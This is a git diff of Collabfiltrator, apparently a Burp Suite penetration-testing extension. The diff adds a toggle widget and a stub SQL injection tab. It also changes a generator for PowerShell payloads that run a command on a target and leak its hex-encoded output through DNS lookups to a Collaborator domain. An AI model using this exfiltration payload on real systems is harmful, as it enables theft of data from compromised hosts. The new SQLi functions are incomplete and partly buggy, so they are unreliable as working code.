@@ -1,10 +1,15 @@
 #Import Burp Objects
 from burp import IBurpExtender, IBurpExtenderCallbacks, ITab, IBurpCollaboratorInteraction
 #Import Java GUI Objects
-from java.awt import Dimension, FlowLayout, Color, Toolkit
+from java.awt import Dimension, FlowLayout, Color, Toolkit, Graphics, Graphics2D, RenderingHints, Cursor
+from java.awt.event import MouseAdapter, MouseEvent
+from java.awt.image import BufferedImage
 from java.awt.datatransfer import Clipboard, StringSelection
 from javax import swing
+from javax.swing import JPanel
 from thread import start_new_thread
+from java.util import Base64
+from java.nio.charset import StandardCharsets
 import sys, time, threading, base64
 try:
     from exceptions_fix import FixBurpExceptions
@@ -15,12 +20,99 @@ t = "" # declare thread globally so we can stop it from any function
 stopThreads = False # Thread Tracker to prevent dangling threads
 exfilFormat = "base64" #Valid Formats: base64, hex
 
+###All this just for a cool toggle switch?
+class ToggleSwitch(JPanel):
+    def __init__(self, width=41, height=21):
+        super(ToggleSwitch, self).__init__()
+        self.activated = False
+        self.switchColor = Color(200, 200, 200)
+        self.buttonColor = Color(255, 255, 255)
+        self.borderColor = Color(50, 50, 50)
+        self.activeSwitch = Color(0, 125, 255)
+        self.puffer = None
+        self.borderRadius = 10
+        self.g = None
+
+        self.addMouseListener(ToggleSwitchMouseListener(self))
+
+        self.setCursor(Cursor(Cursor.HAND_CURSOR))
+        self.setSize(width, height)  # Set the initial size here
+        #self.setBounds(0, 0, 41, 21)
+
+    def paint(self, gr):
+        if self.g is None or self.puffer.getWidth() != self.getWidth() or self.puffer.getHeight() != self.getHeight():
+            self.puffer = BufferedImage(self.getWidth(), self.getHeight(), BufferedImage.TYPE_INT_ARGB)
+            self.g = self.puffer.createGraphics()
+            self.g.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON)
+
+        self.g.setColor(self.activeSwitch if self.activated else self.switchColor)
+        self.g.fillRoundRect(0, 0, self.getWidth() - 1, self.getHeight() - 1, 5, self.borderRadius)
+        self.g.setColor(self.borderColor)
+        self.g.drawRoundRect(0, 0, self.getWidth() - 1, self.getHeight() - 1, 5, self.borderRadius)
+        self.g.setColor(self.buttonColor)
+
+        if self.activated:
+            self.g.fillRoundRect(self.getWidth() // 2, 1, (self.getWidth() - 1) // 2 - 2, (self.getHeight() - 1) - 2, self.borderRadius, self.borderRadius)
+            self.g.setColor(self.borderColor)
+            self.g.drawRoundRect((self.getWidth() - 1) // 2, 0, (self.getWidth() - 1) // 2, self.getHeight() - 1, self.borderRadius, self.borderRadius)
+        else:
+            self.g.fillRoundRect(1, 1, (self.getWidth() - 1) // 2 - 2, (self.getHeight() - 1) - 2, self.borderRadius, self.borderRadius)
+            self.g.setColor(self.borderColor)
+            self.g.drawRoundRect(0, 0, (self.getWidth() - 1) // 2, self.getHeight() - 1, self.borderRadius, self.borderRadius)
+
+        gr.drawImage(self.puffer, 0, 0, None)
+
+    def isActivated(self):
+        return self.activated
+
+    def setActivated(self, activated):
+        self.activated = activated
+
+    def getSwitchColor(self):
+        return self.switchColor
+
+    def setSwitchColor(self, switchColor):
+        self.switchColor = switchColor
+
+    def getButtonColor(self):
+        return self.buttonColor
+
+    def setButtonColor(self, buttonColor):
+        self.buttonColor = buttonColor
+
+    def getBorderColor(self):
+        return self.borderColor
+
+    def setBorderColor(self, borderColor):
+        self.borderColor = borderColor
+
+    def getActiveSwitch(self):
+        return self.activeSwitch
+
+    def setActiveSwitch(self, activeSwitch):
+        self.activeSwitch = activeSwitch
+
+    def getBorderRadius(self):
+        return self.borderRadius
+
+    def setBorderRadius(self, borderRadius):
+        self.borderRadius = borderRadius
+# Define a custom MouseAdapter for the ToggleSwitch
+class ToggleSwitchMouseListener(MouseAdapter):
+    def __init__(self, toggle_switch):
+        self.toggle_switch = toggle_switch
+
+    def mouseReleased(self, event):
+        self.toggle_switch.activated = not self.toggle_switch.activated
+        self.toggle_switch.repaint()
+
+###Build the extension
 class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExtenderCallbacks):
     # Extention information
     EXT_NAME = "Collabfiltrator"
-    EXT_DESC = "Exfiltrate blind remote code execution output over DNS via Burp Collaborator."
+    EXT_DESC = "Exfiltrate blind remote code execution and SQL injection output over DNS via Burp Collaborator."
     EXT_AUTHOR = "Adam Logue, Frank Scarpella, Jared McLaren, Ryan Griffin"
-    EXT_VERSION = "2.1"
+    EXT_VERSION = "2.2b"
     # Output info to the Extensions console and register Burp API functions
     def registerExtenderCallbacks(self, callbacks):
         print ("Name: \t\t"      + BurpExtender.EXT_NAME)
@@ -47,14 +139,16 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
         self.tab.add(self.tabbedPane)
         
         # First tab
-        self.collabfiltratorTab   = swing.Box(swing.BoxLayout.Y_AXIS)
-        self.tabbedPane.addTab("Collabfiltrator", self.collabfiltratorTab)
+        self.RCE_Exfil_Tab = swing.Box(swing.BoxLayout.Y_AXIS)
+        self.tabbedPane.addTab("RCE Exfil", self.RCE_Exfil_Tab)
         
         # Second tab
-        #self.configurationTab = swing.Box(swing.BoxLayout.Y_AXIS)
-        #self.tabbedPane.addTab("Configuration", self.configurationTab)
+        '''
+        self.SQLi_Exfil_Tab = swing.Box(swing.BoxLayout.Y_AXIS)
+        self.tabbedPane.addTab("SQLi Exfil", self.SQLi_Exfil_Tab)
+        '''
         
-        # Create objects for the first tab's GUI
+        # Create objects for the RCE Exfil tab's GUI
         # These rows will add top to bottom on the Y Axis
         self.t1r1 = swing.JPanel(FlowLayout()) # title and description frame
         self.t1r2 = swing.JPanel(FlowLayout()) #platform and command box frame
@@ -65,7 +159,19 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
         self.t1r6 = swing.JPanel(FlowLayout()) # hidden stop listener frame that only appears upon payload generation
         self.t1r8 = swing.JPanel(FlowLayout()) #clearOutput box frame
 
-        # Now add content to the first tab's GUI objects
+        # Create objects for the SQLi Exfil tab's GUI
+        # These rows will add top to bottom on the Y Axis
+        self.t2r1 = swing.JPanel(FlowLayout()) # title and description frame
+        self.t2r2 = swing.JPanel(FlowLayout()) #DBMS and Injection type selection frame
+        self.t2r3 = swing.JPanel(FlowLayout()) #payload box frame
+        self.t2r5 = swing.JPanel(FlowLayout()) #copy payload to clipboard frame
+        self.t2r7 = swing.JPanel(FlowLayout()) #output box frame
+        self.t2r4 = swing.JPanel(FlowLayout()) # collaborator domainname frame
+        self.t2r6 = swing.JPanel(FlowLayout()) # hidden stop listener frame that only appears upon payload generation
+        self.t2r8 = swing.JPanel(FlowLayout()) #clearOutput box frame
+
+
+        # Now add content to the RCE Exfil tab's GUI objects
         self.osComboBox = swing.JComboBox(["Windows PowerShell", "Linux (sh + ping)"])
         self.commandTxt = swing.JTextField("hostname", 35)
         #self.commandTxt = swing.JTextField("dir c:\inetpub\wwwroot", 35)
@@ -86,7 +192,7 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
         self.burpCollaboratorDomainTxt.setEditable(False)
         self.burpCollaboratorDomainTxt.setBackground(None)
         self.burpCollaboratorDomainTxt.setBorder(None)
-        self.t1r1.add(swing.JLabel("<html><center><h2>Collabfiltrator</h2>Exfiltrate blind remote code execution output over DNS via Burp Collaborator.</center></html>"))
+        self.t1r1.add(swing.JLabel("<html><center><h2>Collabfiltrator: RCE Exfil</h2>Exfiltrate blind remote code execution output over DNS via Burp Collaborator.</center></html>")).putClientProperty("html.disable", None)
         self.t1r2.add(swing.JLabel("Platform"))
         self.t1r2.add(self.osComboBox)
         self.t1r2.add(swing.JLabel("Command"))
@@ -104,22 +210,87 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
         self.t1r7.add(self.outputScroll) #add output scroll bar to page
         self.t1r8.add(swing.JButton("Clear Output", actionPerformed=self.clearOutput))
 
+        # Now add content to the SQLi Exfil tab's GUI objects
+        self.dbmsComboBox = swing.JComboBox(["Microsoft SQL (MSSQL)", "MySQL", "PostgreSQL", "Oracle"])
+        self.injectionQueryTypeComboBox = swing.JComboBox(["SELECT", "INSERT", "UPDATE", "DELETE"])
+        #self.commandTxt = swing.JTextField("hostname", 35)
+        #self.commandTxt = swing.JTextField("dir c:\inetpub\wwwroot", 35)
+        self.sqlipayloadTxt = swing.JTextArea(10,55)
+        self.sqlipayloadTxt.setEditable(True)# So you can't messup the generated payload
+        self.sqlipayloadTxt.setLineWrap(True) #Wordwrap the output of payload box
+        self.sqlioutputTxt = swing.JTextArea(10,55)
+        self.sqlioutputScroll = swing.JScrollPane(self.sqlioutputTxt) # Make the output scrollable
+        self.sqlipayloadScroll = swing.JScrollPane(self.sqlipayloadTxt) # Make the payloadText scrollable
 
-        # Add the GUI objects into the first tab
-        self.collabfiltratorTab.add(self.t1r1)
-        self.collabfiltratorTab.add(self.t1r2)
-        self.collabfiltratorTab.add(self.t1r3)
-        self.collabfiltratorTab.add(self.t1r4)
-        self.collabfiltratorTab.add(self.t1r5)
-        self.collabfiltratorTab.add(self.t1r6)
-        self.collabfiltratorTab.add(self.t1r7)
-        self.collabfiltratorTab.add(self.t1r8)
+        self.sqliprogressBar = swing.JProgressBar(5,15)
+        self.sqliprogressBar.setVisible(False) # Progressbar is hiding
+
+        self.sqlioutputTxt.setEditable(False)
+        self.sqlioutputTxt.setLineWrap(True)
+        self.sqliburpCollaboratorDomainTxt = swing.JTextPane() # burp collaboratorTextPane
+        self.sqliburpCollaboratorDomainTxt.setText(" ") #burp collaborator domain goes here
+        self.sqliburpCollaboratorDomainTxt.setEditable(False)
+        self.sqliburpCollaboratorDomainTxt.setBackground(None)
+        self.sqliburpCollaboratorDomainTxt.setBorder(None)
+        self.t2r1.add(swing.JLabel("<html><center><h2>Collabfiltrator: SQLi Exfil</h2>Exfiltrate blind SQL injection execution output over DNS via Burp Collaborator.</center></html>")).putClientProperty("html.disable", None)
+        self.t2r2.add(swing.JLabel("DBMS"))
+        self.t2r2.add(self.dbmsComboBox)
+        self.t2r2.add(swing.JLabel("Injectable Query Type"))
+        self.t2r2.add(self.injectionQueryTypeComboBox)
+        self.t2r2.add(swing.JLabel("Extract"))
+        self.extractComboBox = swing.JComboBox(["CurrentDB", "Databases", "Tables", "Columns", "Data"])
+        self.singlevsallToggleSwitch = ToggleSwitch()
+        self.singlevsallToggleSwitch.setPreferredSize(Dimension(30, 15))
+        self.t2r2.add(self.extractComboBox)
+        self.t2r2.add(swing.JLabel("Single Result"))
+        self.t2r2.add(self.singlevsallToggleSwitch)
+        self.t2r2.add(swing.JLabel("All Results"))
+        self.t2r2.add(swing.JButton("Generate", actionPerformed=self.generateSQLiPayload))
+        self.t2r3.add(swing.JLabel("Payload"))
+        self.t2r3.add(self.sqlipayloadScroll)
+        self.t2r4.add(swing.JLabel("Note: SQLi Payloads are generic and may require minor modification."))        
+        self.t2r4.add(self.sqliburpCollaboratorDomainTxt) #burp Collab Domain will go here
+        self.t2r5.add(swing.JButton("Copy Payload to Clipboard", actionPerformed=self.copyToClipboard))
+        self.t2r6.add(self.sqliprogressBar)
+        self.sqlistopListenerButton = swing.JButton("Stop Listener", actionPerformed=self.stopSQLiListener)
+        self.sqlistopListenerButton.setVisible(False) # hide stopListenerButton
+        self.t2r6.add(self.sqlistopListenerButton)
+        self.t2r7.add(swing.JLabel("Output"))
+        self.t2r7.add(self.sqlioutputScroll) #add output scroll bar to page
+        self.t2r8.add(swing.JButton("Clear Output", actionPerformed=self.clearSQLiOutput))
+
+        # Add the GUI objects into the RCE Exfil tab
+        self.RCE_Exfil_Tab.add(self.t1r1)
+        self.RCE_Exfil_Tab.add(self.t1r2)
+        self.RCE_Exfil_Tab.add(self.t1r3)
+        self.RCE_Exfil_Tab.add(self.t1r4)
+        self.RCE_Exfil_Tab.add(self.t1r5)
+        self.RCE_Exfil_Tab.add(self.t1r6)
+        self.RCE_Exfil_Tab.add(self.t1r7)
+        self.RCE_Exfil_Tab.add(self.t1r8)
+
+        # Add the GUI objects into the SQLi Exfil tab
+        '''
+        self.SQLi_Exfil_Tab.add(self.t2r1)
+        self.SQLi_Exfil_Tab.add(self.t2r2)
+        self.SQLi_Exfil_Tab.add(self.t2r3)
+        self.SQLi_Exfil_Tab.add(self.t2r4)
+        self.SQLi_Exfil_Tab.add(self.t2r5)
+        self.SQLi_Exfil_Tab.add(self.t2r6)
+        self.SQLi_Exfil_Tab.add(self.t2r7)
+        self.SQLi_Exfil_Tab.add(self.t2r8)
+        '''
         
         # Create objects for the second tab's GUI
-        self.dummylabel = swing.JLabel("Burp Collaborator Config options will go here.")
+
+        #self.dummylabel = swing.JLabel("Burp Collaborator Config options will go here.")
         
         # Add the GUI objects into the second tab
-        ########self.configurationTab.add(self.dummylabel)
+        #self.SQLi_Exfil_Tab.add(self.dummylabel)
+
+
+
+
 
         #Register the panel in the Burp GUI
         callbacks.addSuiteTab(self)
@@ -142,8 +313,8 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
     # Create windows powershell base64 payload
     def createPowershellBase64Payload(self, windowsCommand):
         global exfilFormat
-        exfilFormat = "base64"
-        powershellCommand = '''$s=63;$d=".''' + self.collaboratorDomain + '''";$b=[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes((''' + windowsCommand + ''')));$c=[math]::floor($b.length/$s);0..$c|%{$e=$_*$s;$r=$(try{$b.substring($e,$s)}catch{$b.substring($e)}).replace("=","EQLS").replace("+","PLUS");$c=$_.ToString().PadLeft(4,"0");nslookup $c"."$r$d;}'''
+        exfilFormat = "hex"
+        powershellCommand = '''$s=63;$d=".''' + self.collaboratorDomain + '''";$b=-join([BitConverter]::ToString([Text.Encoding]::ASCII.GetBytes((''' + windowsCommand + ''')))).Replace("-", "");$c=[math]::floor($b.length/$s);0..$c|%{$e=$_*$s;$r=$(try{$b.substring($e,$s)}catch{$b.substring($e)});$c=$_.ToString().PadLeft(4,"0");nslookup $c"."$r$d;}'''
         return "powershell -enc " + self._helpers.base64Encode(powershellCommand.encode("UTF-16-LE"))
 
     def killDanglingThreads(self):
@@ -220,13 +391,16 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
 
             for i in range(0, len(check)):
                 dnsQuery = self._helpers.base64Decode(check[i].getProperty('raw_query'))
+                #print dnsQuery
                 preambleOffset = int(dnsQuery[12]) #Offset in dns query where preamble starts (0000,0001,0002,0003....)
                 base64EncodedDataChunkOffset = int(dnsQuery[17]) #Offset in dns query where base64 encoded output data starts
                 base64EncodedDataChunk = ''.join(chr (x) for x in dnsQuery[18:(18+base64EncodedDataChunkOffset)]) #Base64 encoded output data chunk
                 preambleNumber = ''.join(chr (x) for x in dnsQuery[13:(13+preambleOffset)])
                 DNSrecordDict[preambleNumber] = base64EncodedDataChunk #line up preamble with base64EncodedDataChunk containing data
-
+                #print DNSrecordDict 
+            #print DNSrecordDict
             keys = DNSrecordDict.keys()
+            #print keys
 
             ### Check if input stream is done.
             if keys == oldkeys and keys != []:
@@ -240,7 +414,7 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
         self.progressBar.setIndeterminate(False) #turn off progressbar
         self.stopListenerButton.setVisible(False) # hide stopListenerButton
 
-
+        #print DNSrecordDict
         output = showOutput(DNSrecordDict)
         
 
@@ -253,11 +427,26 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
         return
 
 
+    #######SQLi Exfil Functions#######
+    def generateSQLiPayload():
+        return
+    def stopSQLiListener(self, event): #killDanglingThreads, but as a buttonEvent
+        self.killDanglingThreads()
+        self.payloadTxt.setText("")
+        return
+
+    def clearSQLiOutput(self, event): 
+        self.outputTxt.setText("") #clear out output text because button was clicked     
+        return  
+
+
 def showOutput(outputDict): #This has to be on the outside the BurpExtender class or it won't trigger.
     completedInputString = ""
     for chunk in (sorted(outputDict.items())): #Sort by preamble number to put data in order 
+        #print chunk
         completedInputString += chunk[1] # DNSrecordDict.items() returns a tuple so take value from the dict and append it to completedInputString
-    if exfilFormat == "base64":
+        print completedInputString
+    if exfilFormat == "base64": ##DEPRECATED
         output = completedInputString.replace('EQLS','=').replace('PLUS','+') # drop EOF marker and replace any - padding with = and fix PLUSes
         output = base64.b64decode(output)   #this works better than the native Burp base64decode for some reason 
         return output
